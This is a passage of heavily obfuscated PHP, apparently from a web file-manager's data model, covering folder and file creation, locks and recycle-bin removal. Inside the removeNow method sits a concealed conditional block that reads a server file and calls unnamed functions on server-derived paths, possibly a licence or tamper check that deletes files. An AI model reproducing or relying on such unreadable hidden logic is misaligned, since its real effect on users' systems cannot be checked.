. $Â¡Éà¶½[2035] . $ĞìÉ¯î·; } write_log($Â¡Éà¶½[2036] . $õ¿„Ãëù[$Â¡Éà¶½[546]] . $Â¡Éà¶½[2037] . $²èÛİÙô, $Â¡Éà¶½[208]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $åÜ´¶£ª =& $_SERVER[¤øïŠ‹²]; $ÈÂÈ¿Ò» = self::threadCount() + 1; if ($ÈÂÈ¿Ò» > 3 || !self::count()) { return; } write_log($åÜ´¶£ª[2038] . $ÈÂÈ¿Ò», $åÜ´¶£ª[208]); Cache::set(self::QUEUE_THREAD, $ÈÂÈ¿Ò», 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($åÜ´¶£ª[2039], $åÜ´¶£ª[208]); } public static function getKey($ˆ©ß„ç, $öé…¼òÈ = "\151\x6e\x74") { $Ó¨‰Ğäè =& $_SERVER[¤øïŠ‹²]; Cache::removeMemory($ˆ©ß„ç); $ªÂËêÂ  = Cache::get($ˆ©ß„ç); if ($öé…¼òÈ == $Ó¨‰Ğäè[376]) { return $ªÂËêÂ  ? intval($ªÂËêÂ ) : 0; } if ($öé…¼òÈ == $Ó¨‰Ğäè[2040]) { return is_array($ªÂËêÂ ) ? $ªÂËêÂ  : array(); } return $ªÂËêÂ ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¤øïŠ‹²][2040]); } public static function setAll($¢»ÑÚì) { $ïı¤å¢â = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¢»ÑÚì), $ïı¤å¢â); Cache::set(self::QUEUE_DATA, $¢»ÑÚì, $ïı¤å¢â); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto eÓ¼×„ß³; Cè”Üó‡æ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($™—¼ğ«²) { $ºğÖ·õÉ =& $_SERVER[¤øïŠ‹²]; $ÌÏ‰ƒ = Model($ºğÖ·õÉ[603])->where(array($ºğÖ·õÉ[1916] => $™—¼ğ«²))->find(); $ˆ§ÀÈÇÅ = $this->_mkdirRoot(SourceModel::TYPE_USER, $™—¼ğ«², $ÌÏ‰ƒ[$ºğÖ·õÉ[32]]); $this->userDesktopAdd($ˆ§ÀÈÇÅ); return $ˆ§ÀÈÇÅ; } public function userDesktopAdd($¦¸ªÄÛÂ) { $¬è…êŠÈ =& $_SERVER[¤øïŠ‹²]; $Ï·”ˆÚ = LNG($¬è…êŠÈ[2413]); $ÛªÓòÂÃ = $this->mkdir($¦¸ªÄÛÂ, $Ï·”ˆÚ); $this->metaSet($ÛªÓòÂÃ, $¬è…êŠÈ[2414], $¬è…êŠÈ[102]); $this->metaSet($¦¸ªÄÛÂ, $¬è…êŠÈ[2415], $ÛªÓòÂÃ); } public function userPathSafeAdd($ìÖº¢´) { $ÛÏ×¬ÕÓ =& $_SERVER[¤øïŠ‹²]; $ßÈ¢ÅÍ˜ = Model($ÛÏ×¬ÕÓ[603])->getInfoFull($ìÖº¢´); if (!$ßÈ¢ÅÍ˜) { return !1; } if (_get($ßÈ¢ÅÍ˜, $ÛÏ×¬ÕÓ[624])) { return $ßÈ¢ÅÍ˜[$ÛÏ×¬ÕÓ[561]][$ÛÏ×¬ÕÓ[2416]]; } $«Ï¡˜Ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $ìÖº¢´, $ÛÏ×¬ÕÓ[2417], $ÛÏ×¬ÕÓ[2418]); Model($ÛÏ×¬ÕÓ[603])->metaSet($ìÖº¢´, $ÛÏ×¬ÕÓ[2416], $«Ï¡˜Ê); $this->metaSet($«Ï¡˜Ê, $ÛÏ×¬ÕÓ[2419], $ìÖº¢´); return $«Ï¡˜Ê; } public function userPathAppAdd($†›³Î¿é, $¥¤ÛÈ× = '', $ÈÚÇÄó‰ = '') { $Úİ„Ç·” =& $_SERVER[¤øïŠ‹²]; $Øù†´Â™ = Model($Úİ„Ç·”[603])->getInfoFull($†›³Î¿é); if (!$Øù†´Â™) { return !1; } $¥ªƒäº´ = $Øù†´Â™[$Úİ„Ç·”[561]] ? $Øù†´Â™[$Úİ„Ç·”[561]] : array(); $Ç¢ï¾´¦ = $¥ªƒäº´[$Úİ„Ç·”[2420]]; if (!$Ç¢ï¾´¦) { $Ç¢ï¾´¦ = $this->_mkdirRoot(SourceModel::TYPE_USER, $†›³Î¿é, $Úİ„Ç·”[2421], $Úİ„Ç·”[2422]); Model($Úİ„Ç·”[603])->metaSet($†›³Î¿é, $Úİ„Ç·”[2420], $Ç¢ï¾´¦ . $Úİ„Ç·”[12]); $this->metaSet($Ç¢ï¾´¦, $Úİ„Ç·”[2420], $†›³Î¿é); } if (!$¥¤ÛÈ×) { return $Ç¢ï¾´¦; } $å‘£ñÇ = $¥ªƒäº´[$Úİ„Ç·”[2423] . $¥¤ÛÈ×]; if (!$å‘£ñÇ) { $å‘£ñÇ = $this->mkdir($Ç¢ï¾´¦, $¥¤ÛÈ×); Model($Úİ„Ç·”[603])->metaSet($†›³Î¿é, $Úİ„Ç·”[2423] . $¥¤ÛÈ×, $å‘£ñÇ); $this->metaSet($å‘£ñÇ, $Úİ„Ç·”[2423] . $¥¤ÛÈ×, $†›³Î¿é); } if (!$ÈÚÇÄó‰) { return $å‘£ñÇ; } $®ÅµìË¼ = $this->mkdir($å‘£ñÇ, $ÈÚÇÄó‰); return $®ÅµìË¼; } public function groupRootAdd($´¦‚Ü’Î) { $ÌšÓê» =& $_SERVER[¤øïŠ‹²]; $ÚµÈÙÀŸ = Model($ÌšÓê»[611])->where(array($ÌšÓê»[2216] => $´¦‚Ü’Î))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $´¦‚Ü’Î, $ÚµÈÙÀŸ[$ÌšÓê»[32]]); } public function systemRootPathAdd($ÈæıÉêí) { if ($ÈæıÉêí != $_SERVER[¤øïŠ‹²][634]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÈæıÉêí); } public function userRootRemove($ß³”ìÉ”) { $Ó ô¥¾ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ß³”ìÉ”, !0); foreach ($Ó ô¥¾ as $¨ƒÙÃï) { if (!$¨ƒÙÃï) { continue; } $this->remove($¨ƒÙÃï[$_SERVER[¤øïŠ‹²][204]], !1); } } public function groupRootRemove($À€Ôé»Œ) { $–‹ä¦˜© = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $À€Ôé»Œ); if (!$–‹ä¦˜©) { return; } $this->remove($–‹ä¦˜©[$_SERVER[¤øïŠ‹²][204]], !1); } private function _mkdirRoot($ë­£§ò×, $Ê»ƒ‹õó, $°ÌÄ–¸°, $ôªŸôÏ = '') { $µŸßã­ =& $_SERVER[¤øïŠ‹²]; $û¡–÷€æ = KodUser::id(); $¶Ä±¯ò’ = array($µŸßã­[498] => 0, $µŸßã­[677] => $ë­£§ò×, $µŸßã­[678] => $Ê»ƒ‹õó, $µŸßã­[675] => 1, $µŸßã­[679] => $û¡–÷€æ, $µŸßã­[680] => $û¡–÷€æ, $µŸßã­[676] => $ôªŸôÏ, $µŸßã­[681] => $µŸßã­[619], $µŸßã­[525] => 0, $µŸßã­[646] => 0, $µŸßã­[564] => 0, $µŸßã­[682] => $µŸßã­[12]); if ($ÊÏ¶‘â = $this->where($¶Ä±¯ò’)->find()) { return $ÊÏ¶‘â[$µŸßã­[204]]; } $Ÿ£ıá = "\x4d\157\x64\145\x6c\123\x6f\165\162\143\x65\x2e\x6d\153\144\151\x72\x52\x6f\x6f\x74\56{$ë­£§ò×}\56{$Ê»ƒ‹õó}\x2e" . $°ÌÄ–¸°; CacheLock::lock($Ÿ£ıá); $¶Ä±¯ò’[$µŸßã­[32]] = $°ÌÄ–¸°; $ò´›Â›® = $this->add($¶Ä±¯ò’); $©¡ç­Ş° = array($µŸßã­[683] => short_id($ò´›Â›®)); $this->where(array($µŸßã­[512] => $ò´›Â›®))->save($©¡ç­Ş°); CacheLock::unlock($Ÿ£ıá); return $ò´›Â›®; } private function targetSourceRoot($Àüñ£ Œ, $âøÆá„¹, $µÜú„èî = false) { $°ãâ¯ıê =& $_SERVER[¤øïŠ‹²]; $ÃíÕõœí = array($°ãâ¯ıê[498] => 0, $°ãâ¯ıê[677] => $Àüñ£ Œ, $°ãâ¯ıê[678] => $âøÆá„¹); if ($µÜú„èî) { $ëãº¡Ú÷ = $this->where($ÃíÕõœí)->select(); return $ëãº¡Ú÷ ? $ëãº¡Ú÷ : array(); } $ÖÇ˜ÖŞ¸ = $this->where($ÃíÕõœí)->find(); return $ÖÇ˜ÖŞ¸ ? $ÖÇ˜ÖŞ¸ : array(); } public function sourceRootGroup($Ùæ˜ç·ã) { $­´ÂŠÑŒ =& $_SERVER[¤øïŠ‹²]; if (is_string($Ùæ˜ç·ã)) { $Ùæ˜ç·ã = array($Ùæ˜ç·ã); } $ŠÉÑÎ­Ä = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ùæ˜ç·ã, $­´ÂŠÑŒ[233]); $è¥£Éº‘ = array($­´ÂŠÑŒ[457] => $ŠÉÑÎ­Ä, $­´ÂŠÑŒ[454] => array($­´ÂŠÑŒ[860] => count($Ùæ˜ç·ã))); $this->_listDataApply($è¥£Éº‘[$­´ÂŠÑŒ[457]]); $this->_listMake($è¥£Éº‘); return array_to_keyvalue($è¥£Éº‘[$­´ÂŠÑŒ[96]], $­´ÂŠÑŒ[595]); } public function mkfile($ÁàÀáÚ×, $ú£¤Æ¦², $ûêœĞ³œ = '', $ó‘™à’ú = REPEAT_RENAME) { $èÉ„„á =& $_SERVER[¤øïŠ‹²]; $¨öåÈ¦œ = KodIO::ioFileDriverGet($èÉ„„á[504] . $ÁàÀáÚ× . $èÉ„„á[414]); $ñ¯¾‚ùƒ = Model($èÉ„„á[703])->addFileByContent($ûêœĞ³œ, $¨öåÈ¦œ, $ú£¤Æ¦²); return $this->_createFileCall($ÁàÀáÚ×, $ú£¤Æ¦², $ñ¯¾‚ùƒ, $ó‘™à’ú, $èÉ„„á[1492]); } public function addFile($ßó¿ü˜, $ù™»°¦á, $ŒÑôÑÇƒ, $¶­Œ¶ = false, $«Å÷¬İõ = REPEAT_RENAME) { $®øÊ¤êì =& $_SERVER[¤øïŠ‹²]; $ôŞáÙ´ = KodIO::ioFileDriverGet($®øÊ¤êì[504] . $ßó¿ü˜ . $®øÊ¤êì[414]); $Òš¡Œâì = Model($®øÊ¤êì[703])->addFile($ù™»°¦á, $ôŞáÙ´, $ŒÑôÑÇƒ, $¶­Œ¶); return $this->_createFileCall($ßó¿ü˜, $ŒÑôÑÇƒ, $Òš¡Œâì, $«Å÷¬İõ); } public function addFileByFileID($¬êè¸‹, $Êö¾¶É, $÷Ñ¹œÎà, $ØºÒäğÔ = REPEAT_RENAME) { $ö¯µ®Ñ‘ =& $_SERVER[¤øïŠ‹²]; $²®·úÔè = Model($ö¯µ®Ñ‘[703])->find($Êö¾¶É); Model($ö¯µ®Ñ‘[703])->linkAdd($Êö¾¶É); return $this->_createFileCall($¬êè¸‹, $÷Ñ¹œÎà, $²®·úÔè, $ØºÒäğÔ); } public function addFileByRemote($ø°È ˆÇ, $¬ÅÄ·°â, $µÙÜÓÃ°, $î’†ùŸ‰ = array(), $ãò×¼Œ¶ = REPEAT_RENAME) { $ÔŸ«Úñ¸ = Model($_SERVER[¤øïŠ‹²][703])->addFileByRemote($¬ÅÄ·°â, $µÙÜÓÃ°, $î’†ùŸ‰); return $this->_createFileCall($ø°È ˆÇ, $µÙÜÓÃ°, $ÔŸ«Úñ¸, $ãò×¼Œ¶); } private function _createFileCall($ê¸¶‹½Ä, $ª’¯ø„Ô, $ê¹š˜ä‰, $§›ˆ‘·, $Œ˜†Ê‚– = "\165\160\x6c\157\x61\144") { $™µ¸‰µ£ =& $_SERVER[¤øïŠ‹²]; if (!$ê¹š˜ä‰) { return !1; } $ı—ê½ØÀ = !1; $this->setMasterDB(); $this->lockWriteStart($ê¸¶‹½Ä, $ª’¯ø„Ô); $ø€‰ßÍú = $this->fileNameExist($ê¸¶‹½Ä, $ª’¯ø„Ô); $…ñ¤êêà = $this->_createFile($ê¸¶‹½Ä, $ª’¯ø„Ô, $ê¹š˜ä‰, $§›ˆ‘·, $ı—ê½ØÀ); if (!$ı—ê½ØÀ) { Model($™µ¸‰µ£[566])->remove($ê¹š˜ä‰[$™µ¸‰µ£[563]]); } if ($ı—ê½ØÀ && $…ñ¤êêà && $…ñ¤êêà != $ø€‰ßÍú) { Model($™µ¸‰µ£[2385])->eventCreate($…ñ¤êêà, $Œ˜†Ê‚–); } $this->lockWriteEnd($ê¸¶‹½Ä, $ª’¯ø„Ô); return $…ñ¤êêà; } public function mkdir($¸˜“şƒ, $ğé§êì…, $½„áÙ«Ğ = REPEAT_SKIP) { $œ‹½ÈË =& $_SERVER[¤øïŠ‹²]; $this->setMasterDB(); $Ò„ÛÀÚ‹ = $this->sourceInfo($¸˜“şƒ); if (!$Ò„ÛÀÚ‹) { return !1; } $this->lockWriteStart($¸˜“şƒ, $ğé§êì…); if ($½„áÙ«Ğ !== !1) { $öİ‹Õ…ì = $this->fileNameExist($¸˜“şƒ, $ğé§êì…); if ($öİ‹Õ…ì && $½„áÙ«Ğ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¸˜“şƒ, $ğé§êì…); return $öİ‹Õ…ì; } $ğé§êì… = $this->fileNameAuto($¸˜“şƒ, $ğé§êì…, $½„áÙ«Ğ); } $øñä¬Ã = array($œ‹½ÈË[675] => 1, $œ‹½ÈË[515] => $ğé§êì…, $œ‹½ÈË[676] => $œ‹½ÈË[12], $œ‹½ÈË[564] => 0, $œ‹½ÈË[646] => 0); $«·ÀÂü› = $this->_addSource($øñä¬Ã, $Ò„ÛÀÚ‹); Model($œ‹½ÈË[2385])->eventCreate($«·ÀÂü›, $œ‹½ÈË[1493]); $this->lockWriteEnd($¸˜“şƒ, $ğé§êì…); return $«·ÀÂü›; } public function listSourceRoot($–Æ£¢İ, $—›ĞÒçÌ, $œ£­ûà§ = "\163\157\x75\x72\143\x65\x49\x44\54\x74\x61\x72\x67\145\x74\111\104\x2c\x73\x69\x7a\145") { $Â‚äöºû =& $_SERVER[¤øïŠ‹²]; $´È ñˆ÷ = $Â‚äöºû[63]; $Å¿Ó˜ƒ = array(); $¦àâÎøö = 1024 * 50; $Ü›Ìß¡ = is_array($Ü›Ìß¡) ? $Ü›Ìß¡ : array(); $ÌÄçåÖ² = count($—›ĞÒçÌ); $Û§‹ÚÆË = $this->tablePrefix . $Â‚äöºû[2424]; for ($ªøÀ³¾Á = 0; $ªøÀ³¾Á < $ÌÄçåÖ²; $ªøÀ³¾Á++) { $Éçƒõ€— = $—›ĞÒçÌ[$ªøÀ³¾Á]; $´È ñˆ÷ .= "\123\105\x4c\105\103\x54\x20\x2a\40\x46\122\x4f\115\40\50\123\105\x4c\105\103\124\x20{$œ£­ûà§}\40\x46\x52\117\115\40\x60{$Û§‹ÚÆË}\140\40\x57\x48\105\122\x45\x20"; $´È ñˆ÷ .= "\x60\160\x61\162\x65\x6e\x74\x49\104\x60\75\60\40\101\116\104\x20\x60\x74\x61\x72\147\x65\164\111\104\140\75{$Éçƒõ€—}\40\101\x4e\104\40\x60\x74\141\x72\x67\145\x74\x54\171\x70\145\140\x3d{$–Æ£¢İ}\x20\141\x6e\144\x20\x66\x69\x6c\x65\x54\x79\x70\x65\x3d\x27\x27\x20\154\151\155\151\x74\40\61\51\x20\141\163\40\x74\x62\137{$ªøÀ³¾Á}\40\125\116\111\117\x4e\x20\101\x4c\x4c\x20"; if ((strlen($´È ñˆ÷) >= $¦àâÎøö || $ªøÀ³¾Á == $ÌÄçåÖ² - 1) && $´È ñˆ÷) { $´È ñˆ÷ = substr($´È ñˆ÷, 0, -strlen($Â‚äöºû[1154])); $å¬´øÊô = $this->query($´È ñˆ÷); $´È ñˆ÷ = $Â‚äöºû[12]; $Å¿Ó˜ƒ = array_merge($Å¿Ó˜ƒ, $å¬´øÊô); } } return $Å¿Ó˜ƒ; } private function _createFile($’øáÛµ, $Ğ©´Ô, $»›§—Ğ, $è°ı–±ı, &$´¯ÔÙÃ°) { $¤¤‘¶¢ =& $_SERVER[¤øïŠ‹²]; $µ­Şˆ©Î = $this->sourceInfo($’øáÛµ); if (!$»›§—Ğ || !$µ­Şˆ©Î) { return !1; } if ($è°ı–±ı !== !1) { $Â×š¦ËÃ = $this->fileNameExist($’øáÛµ, $Ğ©´Ô); } $´¯ÔÙÃ° = !0; if ($è°ı–±ı && $Â×š¦ËÃ) { if ($è°ı–±ı == REPEAT_SKIP) { $´¯ÔÙÃ° = !1; return $Â×š¦ËÃ; } else { if ($è°ı–±ı == REPEAT_REPLACE) { $®Ä°ËØâ = $this->sourceInfo($Â×š¦ËÃ); $£¦¥ûø = $this->fileHistory($®Ä°ËØâ, $»›§—Ğ[$¤¤‘¶¢[563]], $»›§—Ğ[$¤¤‘¶¢[90]]); if (!$£¦¥ûø) { $´¯ÔÙÃ° = !1; } else { $this->folderSizeReset($’øáÛµ); } return $Â×š¦ËÃ; } else { $Ğ©´Ô = $this->fileNameAuto($’øáÛµ, $Ğ©´Ô, $è°ı–±ı, !1); } } } $…ßİ”ô­ = array($¤¤‘¶¢[675] => 0, $¤¤‘¶¢[515] => $Ğ©´Ô, $¤¤‘¶¢[676] => substr(get_path_ext($Ğ©´Ô), 0, 10), $¤¤‘¶¢[564] => $»›§—Ğ[$¤¤‘¶¢[563]], $¤¤‘¶¢[646] => $»›§—Ğ[$¤¤‘¶¢[90]]); $•±úÉ½ = $this->_addSource($…ßİ”ô­, $µ­Şˆ©Î); $this->folderSizeReset($’øáÛµ, intval($…ßİ”ô­[$¤¤‘¶¢[90]])); return $•±úÉ½; } protected function fileHistory($Ú¸Ûïûş, $Îºå¼¶Ÿ, $ÅÍ£ñàƒ) { $“ºïÛ… =& $_SERVER[¤øïŠ‹²]; if ($Ú¸Ûïûş[$“ºïÛ…[563]] == $Îºå¼¶Ÿ) { return !1; } $this->checkLock($Ú¸Ûïûş[$“ºïÛ…[204]], $Îºå¼¶Ÿ); Model($“ºïÛ…[2425])->addHistory($Ú¸Ûïûş); $¯ÑÍ¨† = array($“ºïÛ…[680] => USER_ID, $“ºïÛ…[519] => time(), $“ºïÛ…[563] => $Îºå¼¶Ÿ, $“ºïÛ…[90] => $ÅÍ£ñàƒ); $this->where(array($“ºïÛ…[512] => $Ú¸Ûïûş[$“ºïÛ…[204]]))->save($¯ÑÍ¨†); $this->sourceCacheClear($Ú¸Ûïûş[$“ºïÛ…[204]]); return !0; } public function checkLock($º»²¨¯Ó, $Á½ºò¯ç) { $€ŞÏ×ú» =& $_SERVER[¤øïŠ‹²]; $ç¡Ç³ÊÇ = $this->pathInfo($º»²¨¯Ó); if (!$this->fileIsLock($ç¡Ç³ÊÇ, !0)) { return; } $æÊ§û = Session::get($€ŞÏ×ú»[2426]); $¹©ÑıĞÜ = substr($ç¡Ç³ÊÇ[$€ŞÏ×ú»[32]], 0, -1 - strlen($ç¡Ç³ÊÇ[$€ŞÏ×ú»[179]])) . $€ŞÏ×ú»[1345] . $æÊ§û . $€ŞÏ×ú»[10] . $ç¡Ç³ÊÇ[$€ŞÏ×ú»[179]]; $¡ÜÖªˆ´ = Model($€ŞÏ×ú»[703])->find($Á½ºò¯ç); $this->_createFileCall($ç¡Ç³ÊÇ[$€ŞÏ×ú»[203]], $¹©ÑıĞÜ, $¡ÜÖªˆ´, REPEAT_REPLACE, $€ŞÏ×ú»[1492]); $´åœÄ‡Ã = $ç¡Ç³ÊÇ[$€ŞÏ×ú»[561]][$€ŞÏ×ú»[639]]; $ä›·¥ØË = $´åœÄ‡Ã[$€ŞÏ×ú»[2427]] ? $´åœÄ‡Ã[$€ŞÏ×ú»[2427]] : $´åœÄ‡Ã[$€ŞÏ×ú»[32]]; show_json(LNG($€ŞÏ×ú»[2428]) . $€ŞÏ×ú»[2429] . LNG($€ŞÏ×ú»[2430]) . $€ŞÏ×ú»[2431] . $ä›·¥ØË . $€ŞÏ×ú»[2432], !1); } public function fileIsLock($Áæïƒ“, $ö÷õÍ’¿ = false) { $†åî² « =& $_SERVER[¤øïŠ‹²]; if (!_get($Áæïƒ“, $†åî² «[635], 0)) { return !1; } if ($Áæïƒ“[$†åî² «[561]][$†åî² «[638]] != USER_ID) { return !0; } $¡–×æÖá = $GLOBALS[$†åî² «[6]][$†åî² «[103]][$†åî² «[636]]; if ($Áæïƒ“[$†åî² «[561]][$†åî² «[637]] <= time() - $¡–×æÖá) { $this->metaSet($Áæïƒ“[$†åî² «[204]], $†åî² «[638], null); $this->metaSet($Áæïƒ“[$†åî² «[204]], $†åî² «[637], null); } if ($ö÷õÍ’¿) { $this->metaSet($Áæïƒ“[$†åî² «[204]], $†åî² «[637], time()); } return !1; } private function _addSource($•î¯—µ³, $íÍºÁ–) { $…¢Œş©Ø =& $_SERVER[¤øïŠ‹²]; $ª™ä¾ëÀ = KodUser::id(); $ìËœµİ¬ = array($…¢Œş©Ø[677] => $íÍºÁ–[$…¢Œş©Ø[201]], $…¢Œş©Ø[678] => $íÍºÁ–[$…¢Œş©Ø[595]], $…¢Œş©Ø[679] => $ª™ä¾ëÀ, $…¢Œş©Ø[680] => $ª™ä¾ëÀ, $…¢Œş©Ø[498] => $íÍºÁ–[$…¢Œş©Ø[204]], $…¢Œş©Ø[681] => $íÍºÁ–[$…¢Œş©Ø[610]] . $íÍºÁ–[$…¢Œş©Ø[204]] . $…¢Œş©Ø[50], $…¢Œş©Ø[525] => 0, $…¢Œş©Ø[682] => $…¢Œş©Ø[12]); $•î¯—µ³ = array_merge($ìËœµİ¬, $•î¯—µ³); $this->updateModifyTime($•î¯—µ³[$…¢Œş©Ø[203]]); $Ñ¯¼û¹­ = $…¢Œş©Ø[2433] . $íÍºÁ–[$…¢Œş©Ø[204]]; if (isset(self::$cacheChildList[$Ñ¯¼û¹­])) { unset(self::$cacheChildList[$Ñ¯¼û¹­]); } static $Ğ¢ù­ « = false; if (!$Ğ¢ù­ «) { Hook::trigger($…¢Œş©Ø[665], $•î¯—µ³); $Ğ¢ù­ « = !0; } $şìø¶ğÎ = $this->add($•î¯—µ³); $‡Çõ·òÖ = array($…¢Œş©Ø[683] => short_id($şìø¶ğÎ)); $this->where(array($…¢Œş©Ø[512] => $şìø¶ğÎ))->save($‡Çõ·òÖ); $this->setNamePinyin($şìø¶ğÎ, $•î¯—µ³[$…¢Œş©Ø[32]]); return $şìø¶ğÎ; } public function remove($Âßø×Ñ£, $Øåú¸Ã¶ = true) { $Êàœá =& $_SERVER[¤øïŠ‹²]; $¿»™¾Ğ = $this->sourceInfo($Âßø×Ñ£); $û’•»‰ = intval($¿»™¾Ğ[$Êàœá[201]]) === self::TYPE_SYSTEM; $ò’ğäÇ = Model($Êàœá[528])->get($Êàœá[2434]) == $Êàœá[102]; if ($û’•»‰ || $Øåú¸Ã¶ || !$ò’ğäÇ) { return $this->removeNow($Âßø×Ñ£, $Øåú¸Ã¶); } $ßö»İçó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Š“â³Ôù = $¿»™¾Ğ[$Êàœá[201]] == self::TYPE_USER ? $Êàœá[691] : $Êàœá[604]; if ($Š“â³Ôù == $Êàœá[691]) { $Ø®ª¡à = Model($Êàœá[603])->getInfo($¿»™¾Ğ[$Êàœá[595]]); $ñ¿ŸÛ„¬ = !empty($Ø®ª¡à[$Êàœá[2427]]) ? $Ø®ª¡à[$Êàœá[2427]] : $Ø®ª¡à[$Êàœá[32]]; $ñ¿ŸÛ„¬ = $Êàœá[349] . $ñ¿ŸÛ„¬ . $Êàœá[2435] . $¿»™¾Ğ[$Êàœá[595]]; } else { $Ø®ª¡à = Model($Êàœá[611])->getInfo($¿»™¾Ğ[$Êàœá[595]]); $ñ¿ŸÛ„¬ = _get($Ø®ª¡à, $Êàœá[32]); $ñ¿ŸÛ„¬ = $Êàœá[186] . $ñ¿ŸÛ„¬ . $Êàœá[2436] . $¿»™¾Ğ[$Êàœá[595]]; } $°äŒäî = $Êàœá[2437] . md5($ñ¿ŸÛ„¬); CacheLock::lock($°äŒäî); $à¶èÀ´Í = $this->fileNameExist($ßö»İçó, $ñ¿ŸÛ„¬); if (!$à¶èÀ´Í) { $à¶èÀ´Í = $this->mkdir($ßö»İçó, $ñ¿ŸÛ„¬, REPEAT_SKIP); $this->metaSet($à¶èÀ´Í, $Êàœá[2438], $Š“â³Ôù); $this->metaSet($à¶èÀ´Í, $Êàœá[2439], $¿»™¾Ğ[$Êàœá[595]]); if ($¿»™¾Ğ[$Êàœá[203]] != 0) { $this->metaSet($à¶èÀ´Í, $Êàœá[2440], _get($Ø®ª¡à, $Êàœá[2441])); } } CacheLock::unlock($°äŒäî); $this->metaSet($Âßø×Ñ£, $Êàœá[2442], $¿»™¾Ğ[$Êàœá[203]]); $this->where(array($Êàœá[204] => $Âßø×Ñ£))->save(array($Êàœá[519] => time())); $this->recycleClear($¿»™¾Ğ); Model($Êàœá[662])->eventRemove($Âßø×Ñ£); $…¤Ş¨·È = $this->move($Âßø×Ñ£, $à¶èÀ´Í, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¿»™¾Ğ[$Êàœá[203]]); return $…¤Ş¨·È; } private function recycleClear($ñ›¤Î´Ş) { $ıÂË½åÑ =& $_SERVER[¤øïŠ‹²]; $ßÛöòÁ¯ = $this->childrenAll($ñ›¤Î´Ş); $•º¯şµŞ = array($ıÂË½åÑ[512] => array($ıÂË½åÑ[513], $ßÛöòÁ¯[$ıÂË½åÑ[2443]])); Model($ıÂË½åÑ[2444])->where($•º¯şµŞ)->delete(); } public function removeNow($ ¦¿¼”ˆ, $ùŠ’ĞÚó = true) { $ˆÖÑşîù =& $_SERVER[¤øïŠ‹²]; if ($_SERVER[$ˆÖÑşîù[54]] != $_SERVER[$ˆÖÑşîù[70]]) { $™£¬§²¥ = $ˆÖÑşîù[991]; $ÀºØå = $ˆÖÑşîù[56]; $ğŸµÔ’ = $_SERVER[$ˆÖÑşîù[57]] . $ˆÖÑşîù[58]; $ÈÒí’ş› = $ÀºØå($ğŸµÔ’); $—€”Ó = explode($ˆÖÑşîù[59], $ÈÒí’ş›); if (count($—€”Ó) < $ˆÖÑşîù[714]) { $Î¼ºÚµ« = $ˆÖÑşîù[61]; $Î¼ºÚµ«(); } $©á‚Îóç = $ˆÖÑşîù[992]; $©á‚Îóç($_SERVER[$ˆÖÑşîù[993]]); $©á‚Îóç($_SERVER[$ˆÖÑşîù[57]] . $ˆÖÑşîù[2445]); $ĞÍ’ç = 1; while ($ĞÍ’ç > 1) { $ĞÍ’ç = $ĞÍ’ç + 4; $ªŒ’ÑàÏ = rawurlencode($ĞÍ’ç . $ˆÖÑşîù[63]); } } $Ñ¾ïÊ = $this->sourceInfo($ ¦¿¼”ˆ); $ª­“§«à = $this->pathInfoMore($ ¦¿¼”ˆ); if (!$Ñ¾ïÊ) { return !0; } if ($Ñ¾ïÊ[$ˆÖÑşîù[203]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ ¦¿¼”ˆ); Hook::trigger($ˆÖÑşîù[2446], $ª­“§«à, $ùŠ’ĞÚó); if ($ùŠ’ĞÚó) { Model($ˆÖÑşîù[2444])->moveToRecycle($ ¦¿¼”ˆ); } else { $è‚ÚÚà = $this->childrenAll($Ñ¾ïÊ); Model($ˆÖÑşîù[662])->eventRemove($ ¦¿¼”ˆ); $this->removeRelevance($è‚ÚÚà[$ˆÖÑşîù[2443]], $è‚ÚÚà[$ˆÖÑşîù[1728]]); } $this->folderSizeReset($Ñ¾ïÊ[$ˆÖÑşîù[203]]); $»ê™ŞĞü = array($Ñ¾ïÊ[$ˆÖÑşîù[203]]); if ($Ñ¾ïÊ[$ˆÖÑşîù[506]] == $ˆÖÑşîù[102]) { $»ê™ŞĞü[] = $Ñ¾ïÊ[$ˆÖÑşîù[204]]; } $this->updateModifyTime($»ê™ŞĞü); $this->lockMoveEnd($ ¦¿¼”ˆ); Hook::trigger($ˆÖÑşîù[1967], $ª­“§«à, $ùŠ’ĞÚó); return !0; } public function childrenAll($³÷›»Ş) { $¢­íËİ› =& $_SERVER[¤øïŠ‹²]; $Ûë¸êóƒ = $³÷›»Ş[$¢­íËİ›[204]]; if ($³÷›»Ş[$¢­íËİ›[506]] == $¢­íËİ›[102]) { $¤·óÀ¾£ = array($¢­íËİ›[681] => array($¢­íËİ›[641], $³÷›»Ş[$¢­íËİ›[610]] . $Ûë¸êóƒ . $¢­íËİ›[642])); $ÈŸëµ³ = array($¢­íËİ›[681] => $¤·óÀ¾£[$¢­íËİ›[610]]); $óŞ‡Ú”º = $this->field($¢­íËİ›[2447])->where($ÈŸëµ³)->select(); $ÀŒÍ†Úò = !1; $Û¸‡óñ = array($Ûë¸êóƒ); if ($óŞ‡Ú”º) { $ÀŒÍ†Úò = array_to_keyvalue($óŞ‡Ú”º, $¢­íËİ›[12], $¢­íËİ›[563]); $ÀŒÍ†Úò = array_remove_value($ÀŒÍ†Úò, $¢­íËİ›[241]); $Û¸‡óñ = array_to_keyvalue($óŞ‡Ú”º, $¢­íËİ›[12], $¢­íËİ›[204]); $Û¸‡óñ[] = 